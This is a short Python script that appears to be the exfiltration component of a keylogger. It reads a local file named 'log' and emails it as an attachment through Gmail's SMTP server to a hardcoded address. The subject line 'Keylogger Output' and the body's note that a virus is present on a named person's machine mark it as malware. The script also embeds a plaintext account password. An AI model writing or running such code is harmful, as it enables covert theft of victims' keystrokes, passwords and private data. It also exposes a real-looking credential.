import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from email.MIMEBase import MIMEBase
from email import encoders

fromaddr = "sangohan50@gmail.com"
toaddr = "sangohan50@gmail.com"

msg = MIMEMultipart()

msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = "Keylogger Output Franck Trehout"

body = "Virus present sur : Franck Trehout"

msg.attach(MIMEText(body, 'plain'))

filename = "log"
attachment = open("log", "rb")

part = MIMEBase('application', 'octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

msg.attach(part)

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(fromaddr, "Huberville1")
text = msg.as_string()
server.sendmail(fromaddr, toaddr, text)
server.quit()
